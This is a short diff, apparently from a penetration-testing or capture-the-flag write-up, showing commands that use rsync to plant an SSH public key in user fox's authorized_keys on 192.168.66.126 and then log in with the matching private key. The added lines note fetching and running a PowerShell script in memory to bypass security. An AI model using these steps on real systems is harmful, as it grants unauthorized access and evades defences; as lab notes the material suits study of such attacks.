@@ -729,3 +729,6 @@ mv authorized_keys.pub authorized_keys
 sudo rsync -av /home/bruiser/Tools/rsync/.ssh/authorized_keys rsync://192.168.66.126/fox/.ssh/
 ssh -i id_rsa fox@192.168.66.126
 ```
+```bash
+Invoke the ps1 in the web request and run it in session to bybass security
+```
